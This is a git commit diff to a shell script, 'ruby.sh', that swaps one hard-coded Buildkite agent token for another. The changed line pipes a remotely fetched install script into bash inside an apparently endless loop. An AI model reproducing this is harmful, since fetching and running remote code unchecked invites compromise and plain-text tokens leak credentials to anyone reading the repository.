78da04ecde087515bc41c2c1274ea1d7699473f2
nosmould864 <pertuyulan7@hotmail.com>
2021-06-13 01:08:43 +0000

    Update 'ruby.sh'

--- ruby.sh
+++ ruby.sh
@@ -5,7 +5,7 @@ screen
 COUNTER=20
 until [  $COUNTER -lt 10 ]; do
  
-TOKEN="895a50a4cede9ff920922e7659b99ebb6c70234069c0e0d5f6" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/master/install.sh`"
+TOKEN="0984b8aef4021cf284191b927d7a92a2a47a5327fffcb37c13" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/master/install.sh`"
 ~/.buildkite-agent/bin/buildkite-agent start
 
  
